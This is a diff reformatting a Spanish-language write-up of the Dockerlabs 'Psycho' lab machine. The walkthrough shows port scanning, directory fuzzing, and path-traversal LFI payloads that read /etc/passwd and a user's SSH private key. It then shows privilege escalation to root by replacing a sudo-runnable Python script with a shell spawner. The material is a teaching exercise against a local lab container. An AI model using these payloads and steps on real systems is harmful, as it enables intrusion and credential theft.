@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Psycho 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Psycho ​​
+
+## 🖥️ Writeup - Psycho
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `LFI` `Gobuster` `Wfuzz` `Sudoers` `Perl` `Python` `Writable File`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip psycho.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh psycho .tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 16:44 CEST
 Nmap scan report for 172.17.0.2
@@ -82,7 +91,7 @@ Tenemos abiertos los puertos `22` y `80`.
 
 Accedemos por `HTTP` y, aparentemente, no encontramos información relevante.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.
 
@@ -91,6 +100,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/D
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -116,7 +126,7 @@ Descubrimos un directorio `/assets`, y dentro un archivo `.jpg`.
 
 Tras inspeccionar los metadatos y buscar posible información oculta en la imagen, no obtenemos nada útil.
 
-# LFI
+## LFI
 
 A continuación, comprobamos si el `index.php` permite apuntar a otros archivos del sistema mediante algún parámetro.
 
@@ -125,6 +135,7 @@ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-
 ```
 
 Info:
+
 ```
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -147,6 +158,7 @@ http://172.17.0.2/index.php?secret=../../../../etc/passwd
 ```
 
 Info:
+
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -178,7 +190,7 @@ luisillo:x:1002:1002::/home/luisillo:/bin/sh
 
 Encontramos dos usuarios: `vaxei` y `luisillo`.
 
-# FUERZA BRUTA
+## FUERZA BRUTA
 
 Probamos un ataque de `fuerza bruta` sobre el puerto `22` (`SSH`) con los 2 usuarios.
 
@@ -190,7 +202,7 @@ Pero no obtenemos ninguna coincidencia.
 
 Aun así, sabemos con certeza que `vaxei` y `luisillo` son usuarios válidos del sistema. Es posible que únicamente puedan acceder por `SSH` mediante una clave `id_rsa`.
 
-# LFI
+## LFI
 
 Aprovechamos de nuevo la vulnerabilidad `LFI` para comprobar si podemos apuntar al archivo `id_rsa` (en caso de que exista), de alguno de los usuarios.
 
@@ -199,6 +211,7 @@ http://172.17.0.2/index.php?secret=../../../../home/vaxei/.ssh/id_rsa
 ```
 
 Info:
+
 ```
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
@@ -249,15 +262,16 @@ chmod 600 id_rsa
 ssh -i id_rsa vaxei@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo` y `SUID`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for vaxei on a06cff2a2ac0:
     env_reset, mail_badpass,
@@ -278,11 +292,12 @@ El pivote resulta exitoso.
 
 Una vez como usuario luisillo, comprobamos permisos `sudo` y `SUID`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for luisillo on a06cff2a2ac0:
     env_reset, mail_badpass,
@@ -293,8 +308,7 @@ User luisillo may run the following commands on a06cff2a2ac0:
     (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
 ```
 
-Con el nuevo usuario, comprobamos que es posible ejecutar el script `paw.py` con privilegios de `root`.
-Para explotarlo, eliminamos el script original y creamos otro con el mismo nombre que contenga nuestro propio código.
+Con el nuevo usuario, comprobamos que es posible ejecutar el script `paw.py` con privilegios de `root`. Para explotarlo, eliminamos el script original y creamos otro con el mismo nombre que contenga nuestro propio código.
 
 ```bash
 rm paw.py
@@ -302,6 +316,7 @@ nano paw.py
 ```
 
 Info:
+
 ```
 import os    
 os.system("/bin/bash")
@@ -314,6 +329,7 @@ sudo -u root /usr/bin/python3 /opt/paw.py
 ```
 
 Info:
+
 ```
 root@a06cff2a2ac0:/opt# whoami
 root
